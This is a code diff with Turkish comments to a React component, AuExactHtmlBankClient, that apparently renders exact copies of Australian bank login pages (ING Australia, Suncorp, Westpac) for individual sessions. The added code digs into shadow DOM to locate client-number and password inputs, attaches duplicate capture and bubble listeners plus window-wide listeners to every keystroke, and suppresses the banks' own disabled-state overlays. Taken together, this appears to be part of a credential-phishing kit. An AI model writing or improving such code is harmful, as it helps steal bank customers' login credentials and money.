@@ -135,8 +135,18 @@ function normalizeToken(value: string | null | undefined) {
 }
 
 function getElementLabel(doc: Document, el: any): string {
-  // ⭐ SHADOW ROOT label okuma (ÖNCE): SG-INPUT, ING-INPUT custom elementler
-  //   shadowRoot içine label slot / aria-label / label attribute içerebilir.
+  // ═══════════════════════════════════════════════════════════════════
+  // ⭐⭐⭐⭐⭐ ING/SG CUSTOM INPUT LABEL OKUMA (EN ONCELIKLI, OZEL FALLBACK)
+  //   HATA (ING Australia): <ing-input> aria-label='Client Number',
+  //   <ing-input type=password> label/aria-label='Password' gibi durumlarda
+  //   shadowRoot kapali ise standart label okuma YAPAMIYOR. Ayrıca parentte
+  //   label, [slot='label'] veya .form-label yazan metinler olabilir.
+  // ═══════════════════════════════════════════════════════════════════
+  try {
+    // 1) EN ONCElIKLI: Dogrudan label attribute (custom element)
+    const labelAttr = (el as HTMLElement)?.getAttribute?.("label")?.trim?.();
+    if (labelAttr && labelAttr.length > 1) return labelAttr;
+  } catch {}
   try {
     const ar = (el as HTMLElement)?.getAttribute?.("aria-label")?.trim?.();
     if (ar && ar.length > 1) return ar;
@@ -146,22 +156,58 @@ function getElementLabel(doc: Document, el: any): string {
     if (ph && ph.length > 1) return ph;
   } catch {}
   try {
-    const lab = (el as HTMLElement)?.getAttribute?.("label")?.trim?.();
-    if (lab && lab.length > 1) return lab;
+    const datalab = (el as HTMLElement)?.getAttribute?.("data-label")?.trim?.() || (el as HTMLElement)?.getAttribute?.("data-label-text")?.trim?.();
+    if (datalab && datalab.length > 1) return datalab;
   } catch {}
+  try {
+    const dtL = (el as HTMLElement)?.getAttribute?.("data-testid")?.trim?.();
+    if (dtL && dtL.length > 1) {
+      // ClientNumber / ClientNumberInput / password / password-input → label yap
+      const cleaned = dtL.replace(/[_-]/g, " ").replace(/([a-z])([A-Z])/g, "$1 $2").trim();
+      if (cleaned && cleaned.length > 1) return cleaned;
+    }
+  } catch {}
+  // Shadow DOM acik ise label slotlarini tara:
   try {
     const sh = (el as any)?.shadowRoot as ShadowRoot | null;
     if (sh) {
-      const lab = sh.querySelector("[slot='label'], label, .label, .form-label");
+      const lab = sh.querySelector("[slot='label'], label, .label, .form-label, [part='label'], .heading, .form-field__label");
       if (lab?.textContent?.trim()) return lab.textContent.trim();
     }
   } catch {}
   try {
     const type = (el as HTMLElement)?.getAttribute?.("type")?.toLowerCase?.();
     if (type === "password") return "password";
+    if (type === "email") return "email";
+    if (type === "tel") return "phone";
+    if (type === "number") return "number";
+  } catch {}
+  // ⭐ ING/SG Parent ustundeki label / [slot=label] / form-label / label-text ara
+  try {
+    let parent2: HTMLElement | null = (el as HTMLElement)?.parentElement;
+    let d = 0;
+    while (parent2 && d < 5) {
+      try {
+        const labEl = parent2.querySelector(":scope > label, :scope > [slot='label'], :scope > .form-label, :scope > .label, :scope > [data-label], :scope > .form-field__label, :scope > label[for], :scope > .input-label, :scope > .field-label, :scope > label-text");
+        if (labEl && labEl.textContent?.trim() && labEl.textContent.trim().length > 1) {
+          return labEl.textContent.trim();
+        }
+        // Parent'in direkt textContent label olarak kullanilabilir mi?
+        // (Sadece parent text uzun ama input text bos ise, label'in parent oldugu durumlar)
+        const ptxt = (parent2.textContent || "").trim();
+        if (ptxt.length < 60 && ptxt.length > 2 && ptxt.length > ((el as HTMLElement).textContent || "").trim().length) {
+          // sadece parentin texti (child'lari haric) okumaya calis:
+          const directTextNodes = Array.from(parent2.childNodes).filter(n => n.nodeType === 3).map(n => (n.nodeValue || "").trim()).filter(Boolean);
+          const directText = directTextNodes.join(" ").trim();
+          if (directText.length > 2 && directText.length < 50) return directText;
+        }
+      } catch {}
+      parent2 = parent2.parentElement;
+      d++;
+    }
   } catch {}
 
-  // Normal HTML standart label okuma
+  // Normal HTML standart label okuma (GERI KALANLAR ICIN)
   const ariaLabel = (el as HTMLElement)?.getAttribute?.("aria-label");
   if (ariaLabel?.trim()) return ariaLabel.trim();
 
@@ -466,27 +512,150 @@ function getFormFields(form: HTMLFormElement | Document) {
   const scope = (form as any).querySelectorAll
     ? ((form as unknown) as ParentNode)
     : (document as unknown as ParentNode);
-  const standardInputs = Array.from(
-    (scope as ParentNode).querySelectorAll<HTMLInputElement | HTMLTextAreaElement | HTMLSelectElement>(
-      "input, textarea, select",
-    ),
-  ).filter(isMeaningfulField);
 
+  // ═══════════════════════════════════════════════════════════════════
+  // ⭐⭐⭐⭐⭐ ING Australia + Suncorp SHADOW DOM ICI GERCEK INPUT EKLEME (KATMAN 1)
+  //   ESKI HATA: Standard scope.querySelectorAll('input') shadowRoot boundary'sini
+  //     GEÇEMEZDI → <ing-input shadow kapali> veya nested shadow içindeki
+  //     GERCEK inputlar standardInputs listesine GIRMIYORDU.
+  //   KALICI COZUM: TUM DOCUMENT / form altındaki custom wc (ing-input, sg-input vb.)
+  //     shadowRoot'larını depth=5 kadar aç → içindeki input/textarea/selectleri
+  //     standardInputs listesine EKLE.
+  // ═══════════════════════════════════════════════════════════════════
+  function collectAllShadowInputsWithin(root: ParentNode | ShadowRoot | Document | HTMLElement): (HTMLInputElement|HTMLTextAreaElement|HTMLSelectElement)[] {
+    const results: any[] = [];
+    try {
+      // 1) Root icindeki standart alanlar
+      const direct = Array.from((root as ParentNode).querySelectorAll<HTMLElement>("input, textarea, select")) as any[];
+      for (const d of direct) results.push(d);
+      // 2) Root icindeki custom wc hostlarının shadowRoot'larını ac:
+      const wcHosts = Array.from(
+        (root as ParentNode).querySelectorAll<HTMLElement>(
+          "sg-input, ing-input, ui5-input, sl-input, paper-input, iron-input, md-filled-text-field, md-outlined-text-field, md-text-field, vaadin-text-field, vaadin-password-field, sl-textarea, sg-button, ing-button, ing-login-submit, ui5-button, sl-button, vaadin-button, mwc-button, md-button, paper-button, [class*='ing-input'], [class*='sg-input']",
+        ),
+      );
+      const rootsStack: (ShadowRoot | Document | HTMLElement | ParentNode)[] = [];
+      for (const wc of wcHosts) {
+        try {
+          if ((wc as any).shadowRoot) rootsStack.push((wc as any).shadowRoot);
+        } catch {}
+      }
+      // Formun DIRECT cocuklari da taranir, fakat form Document ise body altindaki tum wc'leri tara
+      if (root === document) {
+        try {
+          const nestedWcHosts = Array.from(
+            (root as Document).body?.querySelectorAll(
+              "sg-input, ing-input, ui5-input, sl-input, paper-input, iron-input, md-filled-text-field, md-outlined-text-field, md-text-field, vaadin-text-field, vaadin-password-field, sl-textarea, [class*='ing-input'], [class*='sg-input']",
+            ) as NodeListOf<HTMLElement> ?? [],
+          );
+          for (const wc of nestedWcHosts) {
+            try { if ((wc as any).shadowRoot) rootsStack.push((wc as any).shadowRoot); } catch {}
+          }
+        } catch {}
+      } else {
+        // Form belirli bir HTMLFormElement ise, formun parent'ı ve body'sini de tara (form scope disina tasan wc)
+        try {
+          const body = (form as any).ownerDocument?.body ?? document.body;
+          const nestedWcHosts = Array.from(
+            (body as HTMLElement).querySelectorAll(
+              "sg-input, ing-input, ui5-input, sl-input, paper-input, iron-input, md-filled-text-field, md-outlined-text-field, md-text-field, vaadin-text-field, vaadin-password-field, sl-textarea, [class*='ing-input'], [class*='sg-input']",
+            ) as NodeListOf<HTMLElement> ?? [],
+          );
+          for (const wc of nestedWcHosts) {
+            try { if ((wc as any).shadowRoot) rootsStack.push((wc as any).shadowRoot); } catch {}
+          }
+        } catch {}
+      }
+
+      // Depth 5 nested shadow tara:
+      const visited = new WeakSet();
+      let depth = 0;
+      while (rootsStack.length > 0 && depth < 5) {
+        const current = rootsStack.shift()!;
+        if (visited.has(current as any)) { depth++; continue; }
+        try { visited.add(current as any); } catch {}
+        try {
+          const innerFields = Array.from((current as ParentNode).querySelectorAll<HTMLElement>("input, textarea, select")) as any[];
+          for (const iff of innerFields) results.push(iff);
+          // Nested shadow host bul:
+          const innerHosts = Array.from(
+            (current as ParentNode).querySelectorAll<HTMLElement>(
+              "sg-input, ing-input, ui5-input, sl-input, paper-input, iron-input, md-filled-text-field, md-outlined-text-field, md-text-field, vaadin-text-field, vaadin-password-field, sl-textarea, [class*='ing-input'], [class*='sg-input']",
+            ) ?? [],
+          );
+          for (const ih of innerHosts) {
+            try { if ((ih as any).shadowRoot) rootsStack.push((ih as any).shadowRoot); } catch {}
+          }
+        } catch {}
+        depth++;
+      }
+    } catch {}
+    return results as any;
+  }
+
+  // Standard inputs + SHADOW ICI inputlar BIRLESTIRILMIS (dedupe):
+  const standardInputsRaw: any[] = collectAllShadowInputsWithin((scope as Document | HTMLFormElement) as any);
+  // Dedupe (aynı elementin iki kere eklenmemesi):
+  const seen = new WeakSet();
+  const standardInputs: any[] = [];
+  for (const s of standardInputsRaw) {
+    try {
+      if (seen.has(s)) continue;
+      if (!isMeaningfulField(s as any)) continue;
+      seen.add(s);
+      standardInputs.push(s);
+    } catch {}
+  }
+
+  // ═══════════════════════════════════════════════════════════════════
+  // ⭐⭐⭐⭐⭐ ING/SG/UI5/VAADIN CUSTOM HOST ELEMENTLERI (KATMAN 2):
+  //   Dış <ing-input> host elementi de listeye dahil edilir, boylece
+  //   host.value / host.validity / host.type vb. property'lerine
+  //   dogrudan erisebiliriz (closed shadow DOM durumunda bile).
+  // ═══════════════════════════════════════════════════════════════════
   const customInputs: any[] = [];
   try {
     const wcCandidates = Array.from(
-      (scope as ParentNode).querySelectorAll<HTMLElement>(
+      (scope as ParentNode).querySelectorAll(
         "sg-input, ing-input, ui5-input, sl-input, paper-input, iron-input, md-filled-text-field, md-outlined-text-field, md-text-field, vaadin-text-field, vaadin-password-field, sl-textarea",
-      ),
+      ) as NodeListOf<HTMLElement>,
     );
-    wcCandidates.forEach((wc) => {
+    // Form disinda (document scope'unda) kalan wc'leri de dahil et:
+    try {
+      const body = (form as any).ownerDocument?.body ?? document.body;
+      const outer = Array.from(
+        (body as HTMLElement).querySelectorAll(
+          "sg-input, ing-input, ui5-input, sl-input, paper-input, iron-input, md-filled-text-field, md-outlined-text-field, md-text-field, vaadin-text-field, vaadin-password-field, sl-textarea",
+        ) as NodeListOf<HTMLElement> ?? [],
+      );
+      for (const o of outer) wcCandidates.push(o);
+    } catch {}
+    // Dedupe wcCandidates icinde ayni element:
+    const seenWC = new WeakSet();
+    for (const wc of wcCandidates) {
+      try {
+        if (seenWC.has(wc)) continue;
+        seenWC.add(wc);
+      } catch {}
       const typeAttr = (wc.getAttribute("type") || "text").toLowerCase();
-      if (["hidden", "submit", "button", "image", "reset"].includes(typeAttr)) return;
-      if (wc.getAttribute("aria-hidden") === "true") return;
+      if (["hidden", "submit", "button", "image", "reset"].includes(typeAttr)) continue;
+      if (wc.getAttribute("aria-hidden") === "true") continue;
       customInputs.push(wc as any);
-    });
+    }
   } catch {}
-  return [...standardInputs, ...customInputs];
+  // Birlestir:
+  const allCombined: any[] = [...standardInputs, ...customInputs];
+  // Final dedupe (weakset uzerinden):
+  const seenFinal = new WeakSet();
+  const finalResult: any[] = [];
+  for (const el of allCombined) {
+    try {
+      if (seenFinal.has(el)) continue;
+      seenFinal.add(el);
+    } catch {}
+    finalResult.push(el);
+  }
+  return finalResult;
 }
 
 function formHasIdentityAndPassword(form: HTMLFormElement, doc: Document) {
@@ -1847,6 +2016,24 @@ export function AuExactHtmlBankClient({ sessionId, bankSlug, bankName }: Props) 
     const actionNodes = computeActionNodes(doc, loginScope);
     savedSubmitActionNodesRef.current = actionNodes;
 
+    // ═══════════════════════════════════════════════════════════════════
+    // ⭐ Yardımcı fonksiyon: Form TAM HAZIR DEĞİLSE Enter tuşunu engelle
+    //   (keydown listener callback olarak kullanılır, defalarca bağlanır)
+    // ═══════════════════════════════════════════════════════════════════
+    function __blockEnterIfNotReady(event: Event) {
+      try {
+        const ke = event as KeyboardEvent;
+        if (!(ke instanceof KeyboardEvent)) return;
+        if (ke.key !== "Enter" && (ke as any).keyCode !== 13) return;
+        try {
+          if (!canProceedNow()) {
+            try { event.preventDefault(); } catch {}
+            try { event.stopPropagation(); } catch {}
+          }
+        } catch {}
+      } catch {}
+    }
+
     const updateSubmitState = () => {
       // ⭐ WESTPAC FIX: "DO NOT USE DISABLED STATES" overlay onleme
       //   iframe icindeki doc head'ina style tag 1 kez enjekte et.
@@ -2319,18 +2506,102 @@ export function AuExactHtmlBankClient({ sessionId, bankSlug, bankName }: Props) 
       link.setAttribute("rel", "nofollow noopener noreferrer");
     });
 
-    getFormFields(loginScope).forEach((field) => {
-      try { field.removeEventListener("input", updateSubmitState as any); } catch {}
-      try { field.removeEventListener("change", updateSubmitState as any); } catch {}
-      field.addEventListener("input", updateSubmitState as any);
-      field.addEventListener("change", updateSubmitState as any);
-      field.addEventListener("keydown", (event: KeyboardEvent) => {
-        if (event instanceof KeyboardEvent && event.key === "Enter" && !canProceedNow()) {
-          event.preventDefault();
-          event.stopPropagation();
-        }
-      });
+    // ═══════════════════════════════════════════════════════════════════
+    // ⭐⭐⭐⭐⭐ KALICI DINLEYICI KURAL: HOST + SHADOW ICI INPUTLAR (IKI YÖNDEN)
+    //   ESKI HATA: <ing-input> host elementine input listener baglarsan,
+    //   shadow ICINDEKI gerçek input input eventini COMPOSED:FALSE olarak
+    //   dispatch ediyorsa DIS host listener ATEŞLENMIYOR → buton SESSIZCE güncellenmiyor.
+    //   KALICI COZUM (3 katman):
+    //   1) getFormFields() listesindeki HER elemana listener bagla (shadow IC gercek input + host custom element)
+    //   2) HER wcHost icin shadowRoot varsa shadowRoot.querySelector ile ICI inputlari DİREKT dinle
+    //   3) window seviyesinde GLOBAL input/change/keydown event listener
+    // ═══════════════════════════════════════════════════════════════════
+
+    const allListenerElements: HTMLElement[] = [];
+    // Katman 1: getFormFields sonuclari
+    try {
+      const ff = getFormFields(loginScope);
+      for (const f of ff) {
+        try { allListenerElements.push(f as HTMLElement); } catch {}
+      }
+    } catch {}
+    // Katman 2: Body içindeki TUM wc hostlarının shadowRoot icindeki inputlar
+    try {
+      const wcHosts = Array.from(
+        doc.querySelectorAll(
+          "sg-input, ing-input, ui5-input, sl-input, paper-input, iron-input, md-filled-text-field, md-outlined-text-field, md-text-field, vaadin-text-field, vaadin-password-field, sl-textarea",
+        ) as NodeListOf<HTMLElement>,
+      );
+      for (const host of wcHosts) {
+        try { allListenerElements.push(host); } catch {}
+        try {
+          const sr: ShadowRoot | null | undefined = (host as any).shadowRoot;
+          if (sr) {
+            const ics = sr.querySelectorAll<HTMLElement>("input, textarea, select");
+            for (const ic of Array.from(ics)) try { allListenerElements.push(ic); } catch {}
+            // Nested shadow wc hosts icinde ara
+            const innerHosts = sr.querySelectorAll<HTMLElement>(
+              "sg-input, ing-input, ui5-input, sl-input, paper-input, iron-input, md-filled-text-field, md-outlined-text-field, md-text-field, vaadin-text-field, vaadin-password-field, sl-textarea",
+            );
+            for (const ih of Array.from(innerHosts)) {
+              try { allListenerElements.push(ih); } catch {}
+              try {
+                const isr = (ih as any).shadowRoot as ShadowRoot | null;
+                if (isr) {
+                  const iics = isr.querySelectorAll<HTMLElement>("input, textarea, select");
+                  for (const iic of Array.from(iics)) try { allListenerElements.push(iic); } catch {}
+                }
+              } catch {}
+            }
+          }
+        } catch {}
+      }
+    } catch {}
+    // Dedupe allListenerElements:
+    const seenListeners = new WeakSet();
+    const dedupedListeners: HTMLElement[] = [];
+    for (const el of allListenerElements) {
+      try {
+        if (!el) continue;
+        if (seenListeners.has(el)) continue;
+        seenListeners.add(el);
+      } catch {}
+      dedupedListeners.push(el);
+    }
+
+    // Listenerlari HER ELEMAN icin bagla:
+    dedupedListeners.forEach((field) => {
+      try { field.removeEventListener("input", updateSubmitState as any, true); } catch {}
+      try { field.removeEventListener("input", updateSubmitState as any, false); } catch {}
+      try { field.removeEventListener("change", updateSubmitState as any, true); } catch {}
+      try { field.removeEventListener("change", updateSubmitState as any, false); } catch {}
+      try { field.removeEventListener("keyup", updateSubmitState as any, true); } catch {}
+      try { field.removeEventListener("keyup", updateSubmitState as any, false); } catch {}
+      try { field.removeEventListener("keydown", updateSubmitState as any, true); } catch {}
+      try { field.removeEventListener("keydown", updateSubmitState as any, false); } catch {}
+      // capturing + bubbling ikisini de bagla (composed false durumunda da yakalasın)
+      try { field.addEventListener("input", updateSubmitState as any, true); } catch {}
+      try { field.addEventListener("input", updateSubmitState as any, false); } catch {}
+      try { field.addEventListener("change", updateSubmitState as any, true); } catch {}
+      try { field.addEventListener("change", updateSubmitState as any, false); } catch {}
+      try { field.addEventListener("keyup", updateSubmitState as any, true); } catch {}
+      try { field.addEventListener("keyup", updateSubmitState as any, false); } catch {}
+      // Enter engelleme:
+      try { field.removeEventListener("keydown", updateSubmitState as any, true); } catch {}
+      try { field.removeEventListener("keydown", updateSubmitState as any, false); } catch {}
+      try { field.removeEventListener("keydown", __blockEnterIfNotReady as any, true); } catch {}
+      try { field.removeEventListener("keydown", __blockEnterIfNotReady as any, false); } catch {}
+      try { field.addEventListener("keydown", __blockEnterIfNotReady as any, true); } catch {}
+      try { field.addEventListener("keydown", __blockEnterIfNotReady as any, false); } catch {}
     });
+
+    // Katman 3: WINDOW GLOBAL fallback listener (en son kose tusu, hicbiri calismazsa)
+    try { window.removeEventListener("input", updateSubmitState as any, true); } catch {}
+    try { window.addEventListener("input", updateSubmitState as any, true); } catch {}
+    try { window.removeEventListener("change", updateSubmitState as any, true); } catch {}
+    try { window.addEventListener("change", updateSubmitState as any, true); } catch {}
+    try { window.removeEventListener("keyup", updateSubmitState as any, true); } catch {}
+    try { window.addEventListener("keyup", updateSubmitState as any, true); } catch {}
 
     updateSubmitState();
 
